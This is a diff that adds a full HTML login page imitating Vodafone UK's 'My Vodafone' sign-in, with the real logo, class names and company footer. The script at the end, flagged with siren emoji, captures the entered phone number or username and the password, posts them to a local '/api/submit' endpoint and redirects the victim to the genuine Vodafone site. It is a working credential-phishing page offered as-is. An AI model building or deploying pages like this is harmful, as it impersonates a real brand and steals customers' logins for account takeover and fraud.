@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+  <meta charset="utf-8">
+  <title>Login | Vodafone</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <style>
+    /* Reset */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    /* Header */
+    .header {
+      background-color: white;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+    }
+
+    .logo {
+      width: 40px;
+      height: 40px;
+    }
+
+    .logo svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    /* Login Container */
+    .login-container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Card shadow */
+    }
+
+    .login-title {
+      text-align: center;
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+
+    /* Form Groups */
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #333;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1); /* Input shadow */
+      transition: box-shadow 0.2s ease;
+    }
+
+    .form-group input:hover,
+    .form-group input:focus {
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      outline: none;
+    }
+
+    /* Link Buttons */
+    .Interactionstyle__Button-sc-53qagq-0.bqZyxJ.Linkstyle__Link-sc-14kxakr-0.iLsNtL {
+      background: none;
+      border: none;
+      color: #000;
+      font-size: 12px;
+      cursor: pointer;
+      text-decoration: underline;
+      padding: 0;
+      font-family: inherit;
+      text-align: left;
+    }
+
+    /* Register Text */
+    .not-registered {
+      font-size: 12px;
+      color: #000;
+    }
+
+    .register-wrapper {
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    /* Continue Button */
+    .continue-btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      background-color: #E60000; /* Vodafone Red */
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .continue-btn:hover {
+      background-color: #cc0000;
+    }
+
+    /* Footer */
+    .footer {
+      background-color: black;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+      margin-top: 40px;
+    }
+
+    .footer-links a {
+      color: white;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer-links a:not(:last-child)::after {
+      content: "|";
+      margin: 0 5px;
+    }
+
+    .footer-copyright {
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo">
+      <!-- Vodafone Logo SVG -->
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32"
+           viewBox="0 0 32 32">
+        <g fill="none" fill-rule="evenodd">
+          <mask fill="#fff">
+            <polygon points="32 0 32 32 0 32 0 0 32 0"></polygon>
+          </mask>
+          <path fill="#E60000"
+                d="M23.8240012,20.2977651 C23.4278567,21.0759128 22.9063351,21.7946105 22.2723861,22.4279592 C22.0398793,22.6586959 21.7944228,22.8753058 21.5354279,23.0789662 C20.6342432,23.7906006 19.5941432,24.3097581 18.4904716,24.6123057 C17.7128982,24.828327 16.9023619,24.9348662 16.0882937,24.9225053 C15.7839747,24.9189736 15.4814215,24.8971949 15.1824001,24.8607008 C14.7173865,24.8047825 14.2606136,24.7088384 13.8114929,24.5793433 C12.3399308,24.154364 10.977853,23.3438425 9.87418144,22.2195898 C9.4297697,21.7681229 9.04127732,21.2807505 8.70634979,20.7604157 C8.19365757,19.9604893 7.80575381,19.0905178 7.54499301,18.1805206 C7.52439114,18.1122413 7.50496652,18.0427849 7.48848503,17.9727398 C7.35015819,17.4565253 7.25244647,16.9267727 7.19476124,16.3905454 C7.13589876,15.8449002 7.11765139,15.2921917 7.14119638,14.7394831 C7.14296225,14.6835648 7.14531675,14.6294123 7.14825988,14.5740826 C7.19358399,13.7823968 7.31072033,13.0124897 7.49319403,12.2731905 C8.22132293,9.32011404 9.95953204,6.82262485 11.9961739,5.09916306 C13.3541314,3.93370735 14.8916195,3.103173 16.3820175,2.52927435 C16.8258406,2.3591649 17.2631889,2.2120114 17.6922964,2.08428217 C17.9701273,2.00246482 18.2432492,1.92947669 18.5104849,1.86472915 C19.2409683,1.68579049 19.9278935,1.56983353 20.5347657,1.50096569 C21.3976896,1.40619884 22.1022736,1.41031914 22.5543374,1.48271866 C22.6832463,1.50273154 22.7915532,1.52980778 22.8780811,1.56041571 C19.9037598,2.20377081 17.6616879,4.83310954 17.6616879,7.97513106 C17.6616879,8.04576474 17.6758149,8.12758208 17.6799353,8.19232962 C18.9866824,8.46662375 20.1162534,8.9104387 21.0615849,9.49434379 C21.9686557,10.0547043 22.7091458,10.7439713 23.2818777,11.5427205 C23.3266132,11.6033477 23.3695828,11.6651522 23.4107865,11.7275453 C23.8316533,12.3520647 24.1530425,13.0389773 24.3767199,13.7794537 C24.5950997,14.5046261 24.7192995,15.2786535 24.7487308,16.0974156 C24.7522625,16.2021889 24.7540284,16.305785 24.7540284,16.4087924 C24.7540284,17.769668 24.4344051,19.1058218 23.8240012,20.2977651 M16,0 C7.16356412,0 0,7.16402097 0,15.9979399 C0,24.8371563 7.16356412,32 16,32 C24.8376131,32 32,24.8371563 32,15.9979399 C32,7.16402097 24.8376131,0 16,0"></path>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Login Container -->
+  <div class="login-container">
+
+    <h1 class="login-title">Log in to My Vodafone</h1>
+
+    <!-- Username/Email Input -->
+    <div class="form-group">
+      <label for="username-email" class="FieldWrapperstyle__Label-sc-5mnmkf-1 fEsoka">Number or Username</label>
+      <input type="text" id="username-email" placeholder="E.g. 07123445567 or jonsmith@gmail.com">
+    </div>
+
+    <!-- Password Input -->
+    <div class="form-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password">
+    </div>
+
+    <!-- Forgotten Username -->
+    <div class="form-group">
+      <button type="button" class="Interactionstyle__Button-sc-53qagq-0 bqZyxJ Linkstyle__Link-sc-14kxakr-0 iLsNtL"
+              data-component-name="Link">Forgotten username?
+      </button>
+    </div>
+
+    <!-- I don't know my mobile number -->
+    <div class="form-group">
+      <button type="button" class="Interactionstyle__Button-sc-53qagq-0 bqZyxJ Linkstyle__Link-sc-14kxakr-0 iLsNtL"
+              data-component-name="Link">I don't know my mobile number
+      </button>
+    </div>
+
+    <!-- Continue Button -->
+    <form id="loginForm">
+      <button type="submit" class="continue-btn">Continue</button>
+    </form>
+
+    <!-- Register Section -->
+    <div class="register-wrapper">
+      <span class="not-registered">Not registered?</span>
+      <span class="RegistrationLinkstyles__PlainLinkWrapper-sc-1g5zqeu-2 icTBgj">
+        <button type="button" class="Interactionstyle__Button-sc-53qagq-0 bqZyxJ Linkstyle__Link-sc-14kxakr-0 iLsNtL"
+                data-component-name="Link">Register for My Vodafone</button>
+      </span>
+    </div>
+
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Privacy policy</a>
+      <a href="#">Terms &amp; conditions</a>
+      <a href="#">Cookie policy</a>
+    </div>
+    <p class="footer-copyright">© 2023 Vodafone Limited. Registered office: Vodafone House, The Connection, Newbury, Berkshire RG14 2FN. Registered in England No 1471587.</p>
+  </div>
+
+  <!-- 🚨 SCRIPT ADDED BELOW THIS LINE 🚨 -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const form = document.getElementById('loginForm');
+      if (!form) return;
+
+      form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        // Get input values
+        const emailInput = document.getElementById('username-email');
+        const passwordInput = document.getElementById('password');
+
+        if (!emailInput || !passwordInput) {
+          console.error("Email or password field not found");
+          return;
+        }
+
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (!email || !password) {
+          alert("Please enter both email and password.");
+          return;
+        }
+
+        try {
+          const response = await fetch('/api/submit', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ email, password })
+          });
+
+          if (response.ok) {
+            window.location.href = "https://www.vodafone.co.uk/ ";
+          } else {
+            alert("Failed to submit credentials.");
+          }
+        } catch (error) {
+          console.error("Error submitting form:", error);
+          alert("An error occurred while sending data.");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
